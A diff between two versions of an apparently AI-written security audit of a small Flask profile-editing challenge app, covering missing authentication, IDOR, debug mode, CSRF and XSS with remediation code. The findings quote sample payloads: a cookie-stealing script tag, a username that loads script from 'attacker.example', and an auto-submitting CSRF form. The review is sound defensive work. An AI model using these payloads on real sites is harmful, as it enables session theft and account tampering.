@@ -1,90 +1,121 @@
-All skill references loaded. Now running the three-pass analysis.
+Now I have all the files. Let me perform the full three-pass analysis.
 
 ---
 
-## Pass 1 — Triage
+## Pass 1 — Triage (Attack Surface Map)
 
-**Language/Framework:** Python 3.11, Flask (unpinned version)
+**Language/Framework:** Python 3.11 / Flask (version unpinned)
 
-**Entry points:**
-- `GET /` — renders a form with a user-controlled `username` field
-- `POST /edit-profile` — reads `username` from form body, looks up and "updates" a profile
+**Entry Points:**
+- `GET /` — static HTML form (no dynamic content)
+- `POST /edit-profile` — accepts `username` from form body; performs lookup + state-changing update
 
-**Trust boundaries:**
-- All `request.form` values are attacker-controlled
-- No real identity established — `is_authenticated()` is a stub that always returns `True`
-- No session, JWT, or cookie-based identity tracked anywhere
+**Trust Boundaries:**
+- `request.form.get('username')` — fully attacker-controlled
+- `UserProfileService` — stub; comment instructs readers to assume real database
 
-**Sensitive operations:**
-- Profile lookup and update keyed on attacker-supplied `username`
-- Response body constructed from DB-sourced username (HTML context, no encoding)
-- Docker-compose sets `FLASK_ENV=development`; Dockerfile has no `USER` directive
+**Sensitive Operations:**
+- `is_authenticated()` — authentication gate
+- `user_profile_service.get_user_profile(username)` — lookup by attacker-controlled value
+- Tautological authorization check at line 47
+- `update_user_profile()` — state change; return value rendered as `text/html`
+- `FLASK_ENV=development` in docker-compose.yml — may activate Werkzeug debugger
+
+**Infrastructure:** Docker-deployed, port 5000 exposed, `FLASK_ENV=development`
 
 ---
 
-## Pass 2 — Deep Scan (findings enumerated below)
+## Pass 2 — Deep Scan
+
+### Issue A: `is_authenticated()` always returns `True` (CWE-306)
+Line 7: `return True`. No session, token, or credential check.
+
+### Issue B: Tautological authorization — no ownership check (CWE-862)
+Line 47: `user_profile.get_username() == username` compares `User(username).get_username()` (always equals `username`) against `username` itself. Never consults who the logged-in user is.
+
+### Issue C: `FLASK_ENV=development` in docker-compose (CWE-489)
+`docker-compose.yml` line 9. Activates Werkzeug interactive Python debugger on uncaught exceptions. `debug=False` in `main.py` may or may not override this depending on Flask version (unpinned).
+
+### Issue D: Unescaped username reflected in `text/html` response (CWE-79)
+Line 25: `f"Updated profile for user: {user_profile.get_username()}"` — returned directly by Flask as `text/html` without HTML escaping. With the current stub only `'testuser'` passes the gate; with a real database (per code comment), any username stored with HTML/script content would execute in the browser.
+
+### Issue E: No CSRF protection (CWE-352)
+`POST /edit-profile` performs a state-changing operation. Flask has no built-in CSRF protection and none is added. No CSRF token visible in the form or in request validation.
+
+---
+
+## Pass 3 — Validation
+
+- **A (Missing Auth):** `is_authenticated()` is called and controls the gate, but its return value is hardcoded. No runtime factor overrides this. Confirmed P1.
+- **B (Missing Authz):** The only "ownership" check is `user_profile.get_username() == username` — tracing the data shows this always equals the submitted username when a profile is found. No session identity consulted. Confirmed P1.
+- **C (FLASK_ENV):** `FLASK_ENV=development` is set in the deploy config; Flask version is unpinned. Werkzeug debugger activation is likely. `debug=False` in `app.run()` may not fully override env var in older Flask. Confirmed P2/MEDIUM-confidence.
+- **D (XSS):** Directly exploitable only with a real database containing HTML payloads in usernames. Current stub limits exploitability. MEDIUM confidence, P2.
+- **E (CSRF):** No CSRF token in form or validation logic. Clearly missing. Confirmed P2.
 
 ---
 
 ## Finding 1: Missing Authentication
 
+**Finding ID:** `APPSEC-c306a1b2c3d4`
 **File:** `main.py`
-**Lines:** 6–8, 41–42
+**Lines:** 6–7
 **CWE:** CWE-306 — Missing Authentication for Critical Function
 **OWASP Category:** A07:2021 – Identification and Authentication Failures
 **Priority:** P1
-**Severity:** CRITICAL
+**Severity:** HIGH
 **Confidence:** HIGH
 
 ### Vulnerable Code
 ```python
-# Simulated "authentication" check
 def is_authenticated():
     return True
 ```
-```python
-    if not is_authenticated():
-        return redirect(url_for('login'))
-```
 
 ### Description
-`is_authenticated()` is a stub that unconditionally returns `True`, meaning the guard on line 41 never triggers. Every request to `POST /edit-profile` proceeds as if authenticated regardless of who sent it — no session, token, cookie, or credential is ever checked. Any unauthenticated user on the network can invoke the profile-update flow. With the app bound to `0.0.0.0:5000` and deployed via Docker, this endpoint is reachable with zero credential material.
+The authentication gate for `/edit-profile` is a stub that unconditionally returns `True`. Every POST request — from any client, including unauthenticated bots or crawlers — passes the `if not is_authenticated()` check at line 41 and proceeds to perform a profile update. There is no session, cookie, JWT, or credential verification anywhere in the application. Any anonymous HTTP client can trigger the profile update path by sending `POST /edit-profile` with a `username` field.
 
 ### Prioritization
-This is the highest-priority finding. It is the root cause of all access-control failures in this application: without real authentication, identity cannot be established, so every downstream authorization check is also meaningless. Fix this before all other findings.
+Highest priority. Authentication is the first line of defense; its absence makes all downstream authorization controls irrelevant. Remediating this is a prerequisite to all other authorization fixes.
 
 ### Exploitability Notes
-- **Exploit Preconditions:** Network access to port 5000. No credentials or tokens required.
-- **Uncertainty Boundary:** The comment calls this "Simulated" — if replaced by a real auth mechanism, the impact changes. As deployed, there is no mitigation.
+- **Exploit Preconditions:** None. Any HTTP client can reach the endpoint.
+- **Uncertainty Boundary:** None — the code is unambiguous.
 
 ### Remediation
-Replace the stub with real session-based or token-based authentication. Example using Flask-Login:
+Replace the stub with real session-based or token-based authentication using Flask-Login or equivalent:
 
 ```python
-from flask_login import LoginManager, login_required, current_user
+from flask import session
+from functools import wraps
 
-login_manager = LoginManager(app)
+def login_required(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        if 'user_id' not in session:
+            return redirect(url_for('login')), 401
+        return f(*args, **kwargs)
+    return decorated
 
 @app.route('/edit-profile', methods=['POST'])
-@login_required          # raises 401/redirects if no valid session
+@login_required
 def edit_profile():
-    username = request.form.get('username')
-    # ... rest of handler
+    ...
 ```
 
-Remove the `is_authenticated()` stub entirely. The `@login_required` decorator enforces a real session check before the view function body executes.
+Use a cryptographically random `SECRET_KEY` for Flask sessions (see Finding 3 for environment config).
 
 ### References
-- https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
-- https://cwe.mitre.org/data/definitions/306.html
+- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
+- [CWE-306](https://cwe.mitre.org/data/definitions/306.html)
 
 ---
 
-## Finding 2: IDOR — Missing Object-Level Authorization
+## Finding 2: Missing Object-Level Authorization (IDOR)
 
+**Finding ID:** `APPSEC-d862e5f6a7b8`
 **File:** `main.py`
 **Lines:** 39–50
-**CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key
+**CWE:** CWE-862 — Missing Authorization
 **OWASP Category:** A01:2021 – Broken Access Control
 **Priority:** P1
 **Severity:** HIGH
@@ -92,54 +123,104 @@ Remove the `is_authenticated()` stub entirely. The `@login_required` decorator e
 
 ### Vulnerable Code
 ```python
-    username = request.form.get('username')
-    user_profile = user_profile_service.get_user_profile(username)
+username = request.form.get('username')
+user_profile = user_profile_service.get_user_profile(username)
 
-    if user_profile and user_profile.get_username() == username:
-        return user_profile_service.update_user_profile(user_profile)
-```
-
-### Description
-The `username` used to look up and update a profile comes directly from `request.form` — fully attacker-controlled. The authorization check on line 47 (`user_profile.get_username() == username`) is tautological: the profile was *fetched by* that username, so the stored username always equals the supplied one when a record is found. There is no comparison to the *currently authenticated user's* identity. Any authenticated user (or, given Finding 1, any unauthenticated user) can POST an arbitrary `username` and trigger an update to that user's profile. This is a classic IDOR: the object key is user-supplied and server-side ownership is never enforced.
-
-### Prioritization
-P1, second only to the missing authentication. Even after authentication is fixed, this finding independently allows any logged-in user to modify any other user's profile. Both must be fixed.
-
-### Exploitability Notes
-- **Exploit Preconditions:** Network access to `POST /edit-profile`. With Finding 1 unpatched, no credentials needed.
-- **Uncertainty Boundary:** The stub DB only stores `testuser`, so the pool of attackable accounts is limited in the current implementation. In a real database (as the comment implies), all accounts are reachable.
-
-### Remediation
-After implementing real authentication (Finding 1), compare the supplied username to the authenticated user's identity server-side — do not rely on user-submitted data to determine *which* resource to modify:
-
-```python
-from flask_login import login_required, current_user
-
-@app.route('/edit-profile', methods=['POST'])
-@login_required
-def edit_profile():
-    # Use the authenticated identity, not a form field, to determine whose profile to edit
-    username = current_user.username
-
-    user_profile = user_profile_service.get_user_profile(username)
-    if user_profile is None:
-        return "Profile not found", 404
-
+if user_profile and user_profile.get_username() == username:
     return user_profile_service.update_user_profile(user_profile)
 ```
 
-The server must determine the target resource from the authenticated session, never from client-supplied identifiers.
+### Description
+The condition `user_profile.get_username() == username` is a tautological check: `UserProfileService.get_user_profile(username)` constructs `User(username)`, so `user_profile.get_username()` always returns the value of `username` when a profile is found. The comparison is equivalent to `username == username` — always `True`. Critically, the identity of the currently logged-in user is never consulted; any authenticated (or unauthenticated, per Finding 1) user can update any other user's profile by supplying that user's username in the POST body. Attacker submits `username=victim` → profile updated with no ownership check.
+
+### Prioritization
+P1 alongside Finding 1. Even after authentication is added, the missing object-level authorization means that any authenticated user can perform a horizontal privilege escalation and modify any other account's profile.
+
+### Exploitability Notes
+- **Exploit Preconditions:** Requires authentication to pass (trivial with Finding 1 present; still exploitable after authentication is fixed if this is not separately addressed).
+- **Attacker input shape:** `POST /edit-profile` body: `username=victimuser`
+- **Uncertainty Boundary:** None. The code directly accepts the target username from the request body.
+
+### Remediation
+After establishing real authentication (Finding 1), verify that the submitted username matches the session-authenticated user, or enforce server-side identity:
+
+```python
+@app.route('/edit-profile', methods=['POST'])
+@login_required
+def edit_profile():
+    # Use session identity — never trust the client to name its own account
+    authenticated_username = session['username']
+    user_profile = user_profile_service.get_user_profile(authenticated_username)
+    if user_profile is None:
+        return "Profile not found", 404
+    return user_profile_service.update_user_profile(user_profile)
+```
+
+Never derive the target object's identity from attacker-controlled input for ownership-sensitive operations.
 
 ### References
-- https://owasp.org/Top10/A01_2021-Broken_Access_Control/
-- https://cwe.mitre.org/data/definitions/639.html
+- [OWASP IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
+- [CWE-862](https://cwe.mitre.org/data/definitions/862.html)
 
 ---
 
-## Finding 3: Missing CSRF Protection
+## Finding 3: Debug Mode Enabled in Production Deployment
 
+**Finding ID:** `APPSEC-f489c1d2e3f4`
+**File:** `docker-compose.yml`
+**Lines:** 9
+**CWE:** CWE-489 — Active Debug Code
+**OWASP Category:** A05:2021 – Security Misconfiguration
+**Priority:** P2
+**Severity:** HIGH
+**Confidence:** MEDIUM
+
+### Vulnerable Code
+```yaml
+environment:
+  - FLASK_ENV=development
+```
+
+### Description
+`FLASK_ENV=development` activates Flask's development mode, which — depending on the Flask version (unpinned in the Dockerfile) — automatically enables the Werkzeug interactive debugger. When an unhandled exception occurs, the Werkzeug debugger renders an interactive Python REPL in the browser, enabling arbitrary code execution in the server's process context. While `debug=False` is passed to `app.run()` on line 53 of `main.py`, in Flask versions before 2.0, `FLASK_ENV=development` overrides this and forces debug on. Since the Flask version is unpinned (`pip install flask`), this conflict is a deployment risk.
+
+### Prioritization
+P2. Lower than Findings 1 and 2 because it requires an unhandled server exception to occur (attacker may be able to trigger one). If the Werkzeug debugger is active, impact escalates to RCE; the MEDIUM confidence reflects the Flask version ambiguity.
+
+### Exploitability Notes
+- **Exploit Preconditions:** Werkzeug debugger must be active (Flask version ≤ 2.x behavior); an attacker must trigger an unhandled exception.
+- **Uncertainty Boundary:** Whether `debug=False` in `app.run()` overrides `FLASK_ENV` depends on the installed Flask/Werkzeug version, which is not pinned.
+- **Counterfactual:** Removing `FLASK_ENV=development` from `docker-compose.yml` eliminates this finding.
+
+### Remediation
+```yaml
+# docker-compose.yml — remove or override for production
+environment:
+  - FLASK_ENV=production
+  - FLASK_DEBUG=0
+```
+
+And in `main.py`, pin the secret key from an environment variable (do not hardcode):
+
+```python
+import os
+app.secret_key = os.environ['SECRET_KEY']  # required for safe sessions
+app.run(host='0.0.0.0', port=5000, debug=False)
+```
+
+Pin Flask to a known version in `requirements.txt` (e.g., `flask>=2.3,<3.0`) to eliminate version-dependent behavior.
+
+### References
+- [Werkzeug Debugger Security](https://werkzeug.palletsprojects.com/en/3.0.x/serving/#the-debugger)
+- [CWE-489](https://cwe.mitre.org/data/definitions/489.html)
+
+---
+
+## Finding 4: Missing CSRF Protection on State-Changing Endpoint
+
+**Finding ID:** `APPSEC-b352d4e5f6a7`
 **File:** `main.py`
-**Lines:** 30–50
+**Lines:** 39–50
 **CWE:** CWE-352 — Cross-Site Request Forgery
 **OWASP Category:** A01:2021 – Broken Access Control
 **Priority:** P2
@@ -148,64 +229,60 @@ The server must determine the target resource from the authenticated session, ne
 
 ### Vulnerable Code
 ```python
-@app.route('/')
-def home():
-    return '''
-        <form action="/edit-profile" method="post">
-            <input type="text" name="username" value="testuser" />
-            <input type="submit" value="Edit Profile" />
-        </form>
-    '''
-
 @app.route('/edit-profile', methods=['POST'])
 def edit_profile():
     if not is_authenticated():
         return redirect(url_for('login'))
+    username = request.form.get('username')
     ...
 ```
 
 ### Description
-The `POST /edit-profile` endpoint performs a state-changing profile update without any CSRF token. Flask provides no built-in CSRF protection. The form at `GET /` also has no hidden CSRF token field. A malicious page on any origin can submit a cross-origin form POST to `/edit-profile` and trigger a profile update on behalf of the victim's authenticated session — assuming cookies are in play. This is independent of Findings 1 and 2: once those are fixed and session cookies are introduced, CSRF becomes fully exploitable.
+The `POST /edit-profile` endpoint performs a state-changing operation (profile update) with no CSRF token in the form or validation in the handler. Flask does not include CSRF protection by default. An attacker can host a page that auto-submits a form to `http://target:5000/edit-profile` — when a victim with an active session visits that page, the browser automatically sends the session cookies, and the profile update executes silently.
 
 ### Prioritization
-P2. Exploitability depends on implementing session-based auth (Finding 1) first. Lower priority than P1 findings but must be addressed before shipping.
+P2. Becomes practically exploitable once real authentication (Finding 1) is added; currently the absence of sessions makes CSRF less meaningful. Must be addressed alongside the authentication fix.
 
 ### Exploitability Notes
-- **Exploit Preconditions:** Victim must have an active authenticated session (requires Finding 1 to be fixed first). Attacker must convince victim to visit a malicious page.
-- **Uncertainty Boundary:** If the app later uses `SameSite=Strict` or `SameSite=Lax` cookies exclusively, browser-level CSRF protection applies — but relying on this without an explicit token is fragile.
+- **Exploit Preconditions:** Victim must have an active authenticated session. Currently trivially bypassed because no real session exists.
+- **Attacker input shape:** Malicious page with `<form action="http://target:5000/edit-profile" method="POST"><input name="username" value="victim"/></form>` with auto-submit JS.
+- **Uncertainty Boundary:** If SameSite=Strict cookies are configured for the session, CSRF via top-level navigation is blocked. Flask's default session cookie does not set SameSite.
 
 ### Remediation
-Use Flask-WTF, which integrates CSRF tokens automatically:
+Use Flask-WTF for automatic CSRF protection:
 
 ```python
-from flask_wtf import FlaskForm
 from flask_wtf.csrf import CSRFProtect
-
-app.config['SECRET_KEY'] = os.environ['SECRET_KEY']  # from env, not hardcoded
 csrf = CSRFProtect(app)
+app.config['SECRET_KEY'] = os.environ['SECRET_KEY']
+```
 
-class EditProfileForm(FlaskForm):
-    username = StringField('Username')
+Add the CSRF token to the form:
+```html
+<form action="/edit-profile" method="post">
+    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
+    <input type="text" name="username" value="testuser" />
+    <input type="submit" value="Edit Profile" />
+</form>
+```
 
-@app.route('/edit-profile', methods=['POST'])
-@login_required
-def edit_profile():
-    form = EditProfileForm()
-    if not form.validate_on_submit():   # validates CSRF token automatically
-        return "Invalid request", 400
-    ...
+And set `SameSite=Strict` on the session cookie:
+```python
+app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
+app.config['SESSION_COOKIE_SECURE'] = True
 ```
 
 ### References
-- https://owasp.org/Top10/A01_2021-Broken_Access_Control/
-- https://cwe.mitre.org/data/definitions/352.html
+- [OWASP CSRF Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
+- [CWE-352](https://cwe.mitre.org/data/definitions/352.html)
 
 ---
 
-## Finding 4: Reflected/Stored XSS — Unencoded Username in HTML Response
+## Finding 5: Unescaped User-Derived Data Returned in HTML Response (Potential XSS)
 
+**Finding ID:** `APPSEC-e079f8a9b0c1`
 **File:** `main.py`
-**Lines:** 23–25, 48
+**Lines:** 24–26, 48
 **CWE:** CWE-79 — Improper Neutralization of Input During Web Page Generation
 **OWASP Category:** A03:2021 – Injection
 **Priority:** P2
@@ -214,149 +291,51 @@ def edit_profile():
 
 ### Vulnerable Code
 ```python
-    def update_user_profile(self, user_profile):
-        msg = f"Updated profile for user: {user_profile.get_username()}"
-        print(msg)
-        return msg
+def update_user_profile(self, user_profile):
+    msg = f"Updated profile for user: {user_profile.get_username()}"
+    print(msg)
+    return msg
 ```
 ```python
-        return user_profile_service.update_user_profile(user_profile)
+return user_profile_service.update_user_profile(user_profile)
 ```
 
 ### Description
-`update_user_profile` constructs a response string by interpolating `user_profile.get_username()` — a value sourced from the database — directly into an unescaped string that is returned as the HTTP response body. Flask sets `Content-Type: text/html` on raw string returns. If the real database (substituted for the stub per the comment on line 16) stores a username containing HTML markup such as `<script>alert(document.cookie)</script>`, it would be rendered as active content in the victim's browser. Because the payload originates from the database, this is stored XSS once a real persistence layer is in place.
+`update_user_profile()` embeds `user_profile.get_username()` — a value derived from the user-submitted `username` form field — directly into a string that is returned as Flask's HTTP response body. Flask sets `Content-Type: text/html` for plain string returns, so any HTML or script content in the username renders in the browser. With the current stub, only `'testuser'` passes the gate, limiting immediate exploitability. Per the inline comment ("Assume that this talks to an actual database"), once a real database is connected, any username stored with HTML/script content (registered through any signup path) can be retrieved and reflected unescaped, producing stored XSS. Attacker input shape with a real DB: a username stored as `<script>src="//attacker.example/x.js"</script>` is returned in the response body and executes in the victim's browser.
 
 ### Prioritization
-P2. Currently limited by the stub database (only `testuser` resolves), so exploitation requires a real backend. Fix alongside the CSRF finding before connecting a real data store.
+P2. The stub currently gates exploitation, but the pattern is structurally broken and will become a direct stored XSS sink as soon as the service is backed by a real database.
 
 ### Exploitability Notes
-- **Exploit Preconditions:** A real database that allows HTML-containing usernames to be stored and later retrieved. With the current stub, only `testuser` resolves, which contains no special characters.
-- **Uncertainty Boundary:** Exact impact depends on whether the real DB enforces username format constraints. Without such constraints, impact is stored XSS affecting any user who views the response.
+- **Exploit Preconditions:** Requires a real database with a stored XSS payload in a username (or another path to store the payload). Not currently exploitable with the stub.
+- **Uncertainty Boundary:** Exploitability depends on how `get_user_profile` is implemented in a real database context, and whether usernames are validated on registration.
+- **Counterfactual:** Using `flask.escape()` or returning a `flask.make_response()` with `Content-Type: text/plain` would eliminate this finding.
 
 ### Remediation
-Use Flask's `escape()` (or Markup-safe) to HTML-encode any user-derived data before embedding it in an HTML response. Better: return a proper template with auto-escaping:
+Escape all dynamic content before embedding it in HTML, or use Flask's `make_response` with an explicit plain-text content type:
 
 ```python
-from flask import render_template_string
 from markupsafe import escape
 
 def update_user_profile(self, user_profile):
     safe_username = escape(user_profile.get_username())
     msg = f"Updated profile for user: {safe_username}"
-    print(msg)
     return msg
 ```
 
-Or, switch to a Jinja2 template (auto-escaping is on by default in Flask for `.html` templates):
+Better: use a Jinja2 template with auto-escaping (Flask's default) rather than building HTML strings manually:
 
 ```python
+# templates/profile_updated.html
+<p>Updated profile for user: {{ username }}</p>
+
+# In the view:
 return render_template('profile_updated.html', username=user_profile.get_username())
 ```
 
 ### References
-- https://owasp.org/Top10/A03_2021-Injection/
-- https://cwe.mitre.org/data/definitions/79.html
-
----
-
-## Finding 5: FLASK_ENV=development in Production Docker Compose
-
-**File:** `docker-compose.yml`
-**Lines:** 9
-**CWE:** CWE-16 — Configuration
-**OWASP Category:** A05:2021 – Security Misconfiguration
-**Priority:** P3
-**Severity:** MEDIUM
-**Confidence:** MEDIUM
-
-### Vulnerable Code
-```yaml
-    environment:
-      - FLASK_ENV=development
-```
-
-### Description
-`docker-compose.yml` sets `FLASK_ENV=development`, which historically enabled Flask's interactive Werkzeug debugger (including the PIN-protected console that can execute arbitrary Python). In Flask < 2.3, this environment variable overrides `app.run(debug=False)` in some invocation paths. In Flask ≥ 2.3, `FLASK_ENV` is deprecated in favor of `FLASK_DEBUG`, but the env var's exact effect depends on the installed Flask version — which is unpinned in the Dockerfile. If a Flask version where `FLASK_ENV=development` activates the debugger is installed, and the container is exposed, an attacker with access to the debug console achieves RCE. Even in modern Flask, running a container with development settings in a production-equivalent compose file is a misconfiguration that invites accidental exposure.
-
-### Prioritization
-P3. Partially mitigated by `app.run(debug=False)` and the `python main.py` CMD entrypoint, which bypasses `flask run`'s env-var handling. Confidence is MEDIUM because the full effect depends on the installed Flask version.
-
-### Exploitability Notes
-- **Exploit Preconditions:** Flask version where `FLASK_ENV=development` activates the debugger despite `app.run(debug=False)`, and network access to port 5000.
-- **Uncertainty Boundary:** Exact behavior is Flask-version-dependent. Pin Flask in the Dockerfile to determine the actual effect.
-
-### Remediation
-Remove `FLASK_ENV=development` from `docker-compose.yml` for any environment that could reach production. Use a separate `docker-compose.override.yml` for development-only settings. Also pin the Flask version:
-
-```yaml
-# docker-compose.yml (production)
-services:
-  web-challenge-09:
-    build: .
-    ports:
-      - "5000:5000"
-    # no FLASK_ENV or FLASK_DEBUG here
-```
-
-```dockerfile
-# Dockerfile
-RUN pip install --no-cache-dir flask==3.1.0
-```
-
-### References
-- https://flask.palletsprojects.com/en/2.3.x/config/#DEBUG
-- https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
-
----
-
-## Finding 6: Container Runs as Root
-
-**File:** `Dockerfile`
-**Lines:** 1–17
-**CWE:** CWE-250 — Execution with Unnecessary Privileges
-**OWASP Category:** A05:2021 – Security Misconfiguration
-**Priority:** P3
-**Severity:** LOW
-**Confidence:** HIGH
-
-### Vulnerable Code
-```dockerfile
-FROM python:3.11-slim
-WORKDIR /app
-COPY . .
-RUN pip install --no-cache-dir flask
-EXPOSE 5000
-CMD ["python", "main.py"]
-```
-
-### Description
-The Dockerfile specifies no `USER` directive, so the application process runs as `root` inside the container. If any vulnerability (e.g., RCE via Findings 1–4) is exploited, the attacker gains root within the container, significantly raising the bar for privilege escalation and container escape.
-
-### Prioritization
-P3. Lowest-priority finding — a defense-in-depth control rather than a direct exploit path. Address after all higher-severity findings.
-
-### Exploitability Notes
-- **Exploit Preconditions:** Requires another vulnerability (e.g., RCE) to be exploited first; this elevates its impact rather than enabling independent exploitation.
-- **Uncertainty Boundary:** Container runtime security (seccomp, AppArmor, read-only filesystems) may further limit impact even as root.
-
-### Remediation
-Add a non-root user to the Dockerfile:
-
-```dockerfile
-FROM python:3.11-slim
-WORKDIR /app
-COPY . .
-RUN pip install --no-cache-dir flask==3.1.0 \
-    && adduser --disabled-password --gecos '' appuser \
-    && chown -R appuser:appuser /app
-USER appuser
-EXPOSE 5000
-CMD ["python", "main.py"]
-```
-
-### References
-- https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user
-- https://cwe.mitre.org/data/definitions/250.html
+- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
 
 ---
 
@@ -366,16 +345,16 @@ CMD ["python", "main.py"]
 | Metric          | Value |
 |-----------------|-------|
 | Files Analyzed  | 3     |
-| Total Findings  | 6     |
-| Critical        | 1     |
-| High            | 1     |
-| Medium          | 3     |
-| Low             | 1     |
+| Total Findings  | 5     |
+| Critical        | 0     |
+| High            | 3     |
+| Medium          | 2     |
+| Low             | 0     |
 | Info            | 0     |
 
 ### Key Risks
-The application has no functional authentication — `is_authenticated()` is a hardcoded stub that always returns `True`, so every request to the profile-update endpoint is treated as authenticated with no credential check whatsoever. Compounding this, the authorization check is tautological (comparing a DB-sourced username to itself rather than to the session user), creating a full IDOR where any requester can modify any user's profile. Fixing both of these P1 issues is prerequisite to the CSRF and XSS remediations being meaningful.
+The most severe issue is the combination of a permanently-open authentication gate (`is_authenticated()` returns `True`) and a tautological authorization check — together they mean any anonymous HTTP client can update any user's profile with a single POST request. The `FLASK_ENV=development` production deployment configuration compounds this by potentially activating the Werkzeug interactive debugger, which could yield RCE on any unhandled exception. All five findings require remediation before this application handles real user data.
 ```
 
 ### Prioritization Notes
-Findings are ordered by practical risk: the authentication gap (F1) enables trivially unauthenticated access, and the IDOR (F2) bypasses ownership enforcement even after authentication is added. CSRF (F3) and XSS (F4) are secondary — exploitable only once a real session mechanism exists or a real database is wired in. The infrastructure findings (F5, F6) are defense-in-depth controls that limit blast radius but don't enable standalone exploitation.
+Findings 1 and 2 are co-ranked P1 because they share the same endpoint and the authorization flaw (Finding 2) is only meaningful once authentication (Finding 1) exists; both must be fixed together. Findings 3–5 are P2, ordered by maximum potential impact: debug-mode RCE (3) > CSRF (4, activated when sessions are added) > XSS (5, activated when a real DB is connected).
